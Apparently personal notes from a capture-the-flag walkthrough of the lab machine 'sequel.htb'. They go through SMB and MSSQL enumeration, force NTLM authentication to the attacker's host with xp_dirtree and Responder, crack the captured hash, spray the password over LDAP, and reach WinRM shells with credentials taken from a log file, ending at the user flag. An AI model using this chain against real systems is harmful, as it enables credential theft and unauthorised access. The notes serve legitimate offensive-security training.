Nmap port 389 TLS cert:
```
Subject Alternative Name: DNS:dc.sequel.htb, DNS:sequel.htb, DNS:sequel
```
=> Hostnames to add to /etc/hosts: dc.sequel.htb, sequel.htb

# SMB

```bash
smbclient -N -L \\\\dc.sequel.htb\\
# Public

smbclient -N \\\\dc.sequel.htb\\Public
# SQL Server Procedures.pdf
```

File content `SQL Server Procedures.pdf`:
```
=> Usernames: Ryan, Tom, Brandon
=> Brandon admin?
brandon.brown@sequel.htb

MSSQL Guest creds:
user: PublicUser
password: GuestUserCantWrite1
```

# MSSQL

Connect to DB as public user:
```bash
impacket-mssqlclient PublicUser:GuestUserCantWrite1@dc.sequel.htb
```

```sql
select name from sys.databases;
-- name     
-- ------   
-- master   
vtempdb   
-- model    
-- msdb

SELECT IS_SRVROLEMEMBER('sysadmin') AS IsSysadmin;
-- IsSysadmin   
-- ----------   
--          0
```
=> Only default DBs, no sysadmin user

## Responder

```bash
sudo responder -I tun0 -v
```

In the DB run:
```
EXEC MASTER.sys.xp_dirtree '\\10.10.14.58\test', 1, 1
```

Responder captures a NTLMv2 hash:
```
sql_svc::sequel:f5e299ec2583d708:E2A66540A623B8A2F556E2BE664B4E68:010100000000000000C98F933BCDDB013871FB61244A6FC90000000002000800350043004E00590001001E00570049004E002D0048004E005400350047005A005A00360055004E00590004003400570049004E002D0048004E005400350047005A005A00360055004E0059002E00350043004E0059002E004C004F00430041004C0003001400350043004E0059002E004C004F00430041004C0005001400350043004E0059002E004C004F00430041004C000700080000C98F933BCDDB0106000400020000000800300030000000000000000000000000300000AC3C69451BC47EEE512C2FF68F82FAFCE7FA7DBC49CF92FD072881E4A998B3B20A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00350038000000000000000000
```

Crack hash:
```bash
hashcat -m 5600 ntlmv2.hash /usr/share/wordlists/rockyou.txt
```
=> REGGIE1234ronnie
=> `sql_svc:REGGIE1234ronnie`

# Password Spraying

LDAP:
```bash
netexec ldap 10.129.228.253 -u users.txt -p REGGIE1234ronnie -d sequel.htb --continue-on-success

# LDAPS       10.129.228.253  636    DC               [+] sequel.htb\ryan:REGGIE1234ronnie 
# LDAPS       10.129.228.253  636    DC               [+] sequel.htb\tom:REGGIE1234ronnie 
# LDAPS       10.129.228.253  636    DC               [+] sequel.htb\brandon:REGGIE1234ronnie 
# LDAP        10.129.228.253  389    DC               [+] sequel.htb\sql_svc:REGGIE1234ronnie
```
=> netexec broken

# Evil-winrm

```bash
evil-winrm -i dc.sequel.htb -u 'sequel.htb\sql_svc' -p REGGIE1234ronnie -s .
```

PowerView:
```powershell
PowerView.ps1

Get-NetGPO
# displayname              : Default Domain Policy
# displayname              : Default Domain Controllers Policy

Get-GPPermission -Name "Default Domain Policy" -All

Trustee     : Domain Admins
TrusteeType : Group
Permission  : GpoCustom
Inherited   : False

Trustee     : Enterprise Admins
TrusteeType : Group
Permission  : GpoCustom
Inherited   : False

Trustee     : SYSTEM
TrusteeType : WellKnownGroup
Permission  : GpoEditDeleteModifySecurity
Inherited   : False

Trustee     : Authenticated Users
TrusteeType : WellKnownGroup
Permission  : GpoApply
Inherited   : False

Trustee     : ENTERPRISE DOMAIN CONTROLLERS
TrusteeType : WellKnownGroup
Permission  : GpoRead
Inherited   : False
```
=> No GPO insecure perms

## Enum

Users:
```
net users

User accounts for \\

-------------------------------------------------------------------------------
Administrator            Brandon.Brown            Guest
James.Roberts            krbtgt                   Nicole.Thompson
Ryan.Cooper              sql_svc                  Tom.Henn
```

MSSQL server log file:
```powershell
ls C:\SQLServer\Logs\
# ERRORLOG.BAK

download "C:\SQLServer\Logs\ERRORLOG.BAK"
```

View on linux:
```bash
dos2unix ERRORLOG.BAK
less ERRORLOG.BAK

cat ERRORLOG.BAK| grep user
# 2022-11-18 13:43:07.44 Logon       Logon failed for user 'sequel.htb\Ryan.Cooper'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1]
# 2022-11-18 13:43:07.48 Logon       Logon failed for user 'NuclearMosquito3'. Reason: Password did not match that for the login provided. [CLIENT: 127.0.0.1
```
=> `sequel.htb\Ryan.Cooper:NuclearMosquito3`

# Evil-winrm as Ryan

```bash
evil-winrm -i dc.sequel.htb -u 'sequel.htb\Ryan.Cooper' -p NuclearMosquito3
```

Flag:
```powershell
type C:\Users\Ryan.Cooper\Desktop\user.txt
# 58628f08770c346e04004a426ba1631a
```